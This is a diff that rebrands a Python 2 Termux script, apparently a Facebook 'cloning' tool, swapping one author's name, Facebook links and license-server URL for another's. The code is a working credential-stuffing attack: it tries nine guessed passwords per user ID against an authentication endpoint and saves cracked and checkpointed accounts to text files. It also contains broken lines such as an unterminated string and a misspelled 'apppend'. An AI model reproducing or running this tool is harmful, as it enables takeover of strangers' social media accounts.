@@ -7,8 +7,8 @@
 import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-__author__ = 'Asghar Latif'
-__copyright = 'All rights reserved . Copyright  Malik Asghar'
+__author__ = 'Rana Nadeem'
+__copyright = 'All rights reserved . Copyright  Rana Nadeem Rajput
 os.system('termux-setup-storage')
 try:
     os.mkdir('/sdcard/ids')
@@ -31,15 +31,15 @@ def reg():
     os.system('clear')
     print logo
     print ''
-    print '\x1b[1;32;1m Enjoy Free Cloning'
+    print '\x1b[1;32;1m wellcome to Rajput Tools for cotact add me on fb'
     print ''
     time.sleep(1)
     try:
-        to = open('/sdcard/.malik.txt', 'r').read()
+        to = open('/sdcard/.Rana5214.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/Rananadeem5214/freeclone/main/server.txt').text
+    r = requests.get('https://raw.githubusercontent.com/Rananadeem5214/clo9i9g/main/server.txt').text
     if to in r:
         os.system('cd ..... && npm install')
         os.system('fuser -k 5000/tcp &')
@@ -55,7 +55,7 @@ def reg():
         print ' \x1b[1;92mCopy the id and send to admin'
         print ' \x1b[1;92mYour id: ' + to
         raw_input('\x1b[1;93m Press enter to send id')
-        os.system('xdg-open https://www.facebook.com/malikasghar.latif.9')
+        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
         reg()
 
 
@@ -68,7 +68,7 @@ def reg2():
     print ' Your id: ' + id
     print ''
     raw_input(' Press enter to go to Facebook ')
-    os.system('xdg-open https://www.facebook.com/malikasghar.latif.9')
+    os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
     sav = open('/sdcard/.malik.txt', 'w')
     sav.write(id)
     sav.close()
@@ -120,7 +120,7 @@ def log_menu():
 
 
 def log_menu_s():
-    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80Rana\xe2\x9e\xa4 ')
     if s == '1':
         log_fb()
     elif s == '2':
@@ -252,7 +252,7 @@ def menu():
 
     os.system('clear')
     print logo
-    tok = open('/sdcard/.malik.txt', 'r').read()
+    tok = open('/sdcard/.Rana5214.txt', 'r').read()
     print '  \x1b[1;92mLogged in user: \x1b[1;91m' + z
     print 47 * '-'
     print ' \x1b[1;93m Active token: \x1b[1;91m' + tok
@@ -267,7 +267,7 @@ def menu():
 
 
 def menu_s():
-    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Rana\xe2\x9e\xa4 ')
     if ms == '1':
         auto_crack()
     elif ms == '2':
@@ -337,7 +337,7 @@ def a_s():
     id = []
     cps = []
     oks = []
-    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80ASGHAR\xe2\x9e\xa4 ')
+    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Rana\xe2\x9e\xa4 ')
     if a_s == '1':
         os.system('clear')
         print logo
@@ -435,14 +435,14 @@ def a_s():
             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
             q = json.loads(data)
             if 'loc' in q:
-                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
-                ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                 ok.write(uid + ' | ' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in q['error']:
-                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass1
-                cp = open('ASGHAR_CP.txt', 'a')
+                print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass1
+                cp = open('RANA_CP.txt', 'a')
                 cp.write(uid + ' | ' + pass1 + '\n')
                 cp.close()
                 cps.append(uid + pass1)
@@ -451,14 +451,14 @@ def a_s():
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
-                    print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
-                    ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                    print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                     ok.write(uid + ' | ' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in q['error']:
-                    print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass2
-                    cp = open('ASGHAR_CP.txt', 'a')
+                    print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass2
+                    cp = open('RANA_CP.txt', 'a')
                     cp.write(uid + ' | ' + pass2 + '\n')
                     cp.close()
                     cps.append(uid + pass2)
@@ -467,14 +467,14 @@ def a_s():
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
-                        print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
-                        ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                        print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                         ok.write(uid + ' | ' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in q['error']:
-                        print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass3
-                        cp = open('ASGHAR_CP.txt', 'a')
+                        print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass3
+                        cp = open('RANA_CP.txt', 'a')
                         cp.write(uid + ' | ' + pass3 + '\n')
                         cp.close()
                         cps.append(uid + pass3)
@@ -483,14 +483,14 @@ def a_s():
                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                         q = json.loads(data)
                         if 'loc' in q:
-                            print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
-                            ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                            print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                             ok.write(uid + ' | ' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in q['error']:
-                            print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass4
-                            cp = open('ASGHAR_CP.txt', 'a')
+                            print '\x1b[1;31;1m[RANA_CP] ' + uid + ' | ' + pass4
+                            cp = open('RANA_CP.txt', 'a')
                             cp.write(uid + ' | ' + pass4 + '\n')
                             cp.close()
                             cps.apppend(uid + pass4)
@@ -499,14 +499,14 @@ def a_s():
                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                             q = json.loads(data)
                             if 'loc' in q:
-                                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
-                                ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                                print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                 ok.write(uid + ' | ' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in q['error']:
-                                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass5
-                                cp = open('ASGHAR_CP.txt', 'a')
+                                print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass5
+                                cp = open('RANA_CP.txt', 'a')
                                 cp.write(uid + ' | ' + pass5 + '\n')
                                 cp.close()
                                 cps.apppend(uid + pass5)
@@ -515,14 +515,14 @@ def a_s():
                                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                 q = json.loads(data)
                                 if 'loc' in q:
-                                    print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
-                                    ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                                    print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                     ok.write(uid + ' | ' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in q['error']:
-                                    print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass6
-                                    cp = open('ASGHAR_CP.txt', 'a')
+                                    print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass6
+                                    cp = open('RANA_CP.txt', 'a')
                                     cp.write(uid + ' | ' + pass6 + '\n')
                                     cp.close()
                                     cps.apppend(uid + pass6)
@@ -531,14 +531,14 @@ def a_s():
                                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                     q = json.loads(data)
                                     if 'loc' in q:
-                                        print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
-                                        ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                                        print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                         ok.write(uid + ' | ' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in q['error']:
-                                        print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass7
-                                        cp = open('ASGHAR_CP.txt', 'a')
+                                        print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass7
+                                        cp = open('RANA_CP.txt', 'a')
                                         cp.write(uid + ' | ' + pass7 + '\n')
                                         cp.close()
                                         cps.apppend(uid + pass7)
@@ -547,14 +547,14 @@ def a_s():
                                         data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                         q = json.loads(data)
                                         if 'loc' in q:
-                                            print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
-                                            ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                                            print '\x1b[1;92m[RANA_OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                             ok.write(uid + ' | ' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in q['error']:
-                                            print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass8
-                                            cp = open('ASGHAR_CP.txt', 'a')
+                                            print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass8
+                                            cp = open('RANA_CP.txt', 'a')
                                             cp.write(uid + ' | ' + pass8 + '\n')
                                             cp.close()
                                             cps.apppend(uid + pass8)
@@ -563,13 +563,13 @@ def a_s():
                                             data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                             q = json.loads(data)
                                             if 'loc' in q:
-                                                print '\x1b[1;92m[ASGHAR-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
-                                                ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
+                                                print '\x1b[1;92m[RANA-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
+                                                ok = open('/sdcard/ids/RANA_OK.txt', 'a')
                                                 ok.write(uid + ' | ' + pass9 + '\n')
                                                 ok.close()
                                                 oks.append(uid + pass9)
                                             elif 'www.facebook.com' in q['error']:
-                                                print '\x1b[1;31;1m[ASGHAR-CP] ' + uid + ' | ' + pass9
+                                                print '\x1b[1;31;1m[RANA-CP] ' + uid + ' | ' + pass9
                                                 cp = open('ASGHAR_CP.txt', 'a')
                                                 cp.write(uid + ' | ' + pass9 + '\n')
                                                 cp.close()
